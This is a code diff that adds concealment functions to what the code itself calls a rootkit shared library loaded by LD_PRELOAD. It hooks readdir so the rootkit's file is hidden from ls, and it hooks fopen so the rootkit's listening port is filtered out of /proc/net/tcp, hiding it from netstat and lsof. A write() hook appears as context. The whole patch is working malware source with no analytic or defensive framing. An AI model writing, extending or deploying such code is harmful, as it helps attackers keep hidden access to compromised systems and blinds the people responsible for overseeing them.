@@ -64,3 +64,46 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) {
 
 	return result;
 }
+
+/* Hide from ls */
+struct dirent *(*real_readdir) (DIR *dir);
+struct dirent *readdir(DIR *dirp) {
+  real_readdir = dlsym(RTLD_NEXT, "readdir");
+  struct dirent *dir;
+  
+  /* finds file that doesn't contain rootkit.so */
+  while (dir = real_readdir(dirp))
+    if (strstr(dir->d_name, LIBRARY_FILENAME) == 0)
+      break;
+
+  return dir;
+}
+
+/* Hide from netstat and lsof */
+FILE *fopen(const char *pathname, const char *mode) {
+    FILE *(*real_fopen) (const char *pathname, const char *mode);
+    real_fopen = dlsym(RTLD_NEXT, "fopen");
+
+    /* if file is not important, then return fopen normally */
+	/* /proc/net/tcp -> requests info about open ports from OS */
+    if (strstr(pathname, "/proc/net/tcp") == NULL)
+        return real_fopen(pathname, mode);
+
+  /* convert port to string */
+  char S_BIND_PORT[6];
+  itoa(BIND_PORT, S_BIND_PORT, 10);
+
+	/* create temporary file to store new return value */
+    char line[256];
+    FILE *temp = tmpfile();
+    FILE *fp = real_fopen(pathname, mode);
+
+	/* copies all lines from original fopen, excluding rootkit port number */
+    while (fgets(line, sizeof(line), fp)) {
+        /* line doesn't contain rootkit port number */
+        if (strstr(line, S_BIND_PORT) == NULL)
+            fputs(line, temp);
+    }
+
+    return temp;
+}
